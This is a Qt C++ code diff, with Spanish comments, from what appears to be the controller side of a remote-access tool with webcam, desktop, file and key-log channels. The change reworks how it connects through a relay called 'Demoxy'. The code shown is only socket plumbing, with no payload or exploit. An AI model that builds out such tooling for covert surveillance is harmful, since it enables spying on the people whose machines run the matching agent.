@@ -121,6 +121,7 @@ MainWindow::MainWindow ( QWidget *parent ) :
   connect (ui->botonLimpiarLog,SIGNAL(clicked()),this,SLOT(limpiarKey()));
   connect (ui->botonInformacion,SIGNAL(clicked()),this,SLOT(pedirInformacion()));
   connect (ui->botonDemoxy,SIGNAL(clicked()),this,SLOT(conectarDemoxy()));
+  connect (&socketDemoxy,SIGNAL(readyRead()),this,SLOT(llegadaDatosDemoxy()));
   hilo.start();
   escritorio.moveToThread(&hilo);
 }
@@ -322,44 +323,52 @@ void MainWindow::nuevaConexionWebcam()
 }
 void MainWindow::conectarDemoxy()
 {
-    /** sistema de conexión Demoxy **/
     ui->botonEscuchar->setEnabled(false); //No puede estar conectado a demoxy y escuchando conexiones a la vez (Por ahora)
-    activo = 0; //Utilizamos el socket 0 para conectar a Demoxy
-    socket[activo] = new QTcpSocket(this);
-    ventana.socketArchivos[activo] = new QTcpSocket(this);
-    escritorio.socketEscritorio[activo] = new QTcpSocket(this);
-    webcam.socketWebcam[activo] = new QTcpSocket(this);
-    QString host = QInputDialog::getText ( &ventana,tr("Host"),tr("Introduce la direccion del host") );
+    hostDemoxy = QInputDialog::getText ( &ventana,tr("Host"),tr("Introduce la direccion del host") );
+    socketDemoxy.connectToHost(hostDemoxy,5555);
+}
+void MainWindow::nuevaConexionDemoxy()
+{
+    /** sistema de conexión Demoxy **/
+
+
+    socket[conexiones] = new QTcpSocket(this);
+    ventana.socketArchivos[ventana.conexiones] = new QTcpSocket(this);
+    escritorio.socketEscritorio[escritorio.conexiones] = new QTcpSocket(this);
+    webcam.socketWebcam[webcam.conexiones] = new QTcpSocket(this);
+
     //Realizamos la conexion en los puertos 1111,2222,3333,4444
-    socket[activo]->connectToHost(host,1111);
-    ventana.socketArchivos[activo]->connectToHost(host,2222);
-    escritorio.socketEscritorio[activo]->connectToHost(host,3333);
-    webcam.socketWebcam[activo]->connectToHost(host,4444);
-    connect ( socket[activo],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
+    socket[conexiones]->connectToHost(hostDemoxy,1111);
+    ventana.socketArchivos[ventana.conexiones]->connectToHost(hostDemoxy,2222);
+    escritorio.socketEscritorio[escritorio.conexiones]->connectToHost(hostDemoxy,3333);
+    webcam.socketWebcam[webcam.conexiones]->connectToHost(hostDemoxy,4444);
+    connect ( socket[conexiones],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
     //Notificamos si cada socket esta correctamente conectado
-    if( ventana.socketArchivos[activo]->state() == QAbstractSocket::ConnectedState )
+
+    if( ventana.socketArchivos[ventana.conexiones]->state() == QAbstractSocket::ConnectedState )
     {
       ui->notificacionLabel->setText(tr("socket principal conectado a Demoxy"));
     }
-    if(escritorio.socketEscritorio[activo]->state() == QAbstractSocket::ConnectedState)
+    if(escritorio.socketEscritorio[escritorio.conexiones]->state() == QAbstractSocket::ConnectedState)
     {
       ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de escritorio conectado a Demoxy."));
     }
-    if(webcam.socketWebcam[activo]->state() == QAbstractSocket::ConnectedState)
+    if(webcam.socketWebcam[webcam.conexiones]->state() == QAbstractSocket::ConnectedState)
     {
       ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de webcam conectado a Demoxy."));
     }
+    conexiones++;
+    ventana.conexiones++;
+    escritorio.conexiones++;
+    webcam.conexiones++;
+    ui->servidoresLista->addItem("Servidor Demoxy");
 }
-
 void MainWindow::llegadaDatos()
 {
   /** Esta funcion se ejecuta cuando llegan datos del socket principal **/
   QString datos = socket[activo]->readAll(); //Leemos los datos
   QStringList parametros = datos.split ( "|@|" ); //Separamos los parametros por |@|
-  if( parametros[0] == "conectado") //Si la conexión proviene a traves de Demoxy
-  {
-    ui->servidoresLista->addItem("Servidor Demoxy");
-  }
+
   if( datos == "pong") //Si recibe respuesta de un ping
   {
     util.ventanaEmergente("responde");
@@ -427,7 +436,12 @@ void MainWindow::llegadaDatos()
 }
 void MainWindow::llegadaDatosDemoxy()
 {
-
+    QString datos = socketDemoxy.readAll(); //Leemos los datos
+    QStringList parametros = datos.split ( "|@|" ); //Separamos los parametros por |@|
+    if( parametros[0] == "conectado") //Si la conexión proviene a traves de Demoxy
+    {
+      this->nuevaConexionDemoxy();
+    }
 }
 void MainWindow::seleccionarServidor()
 {
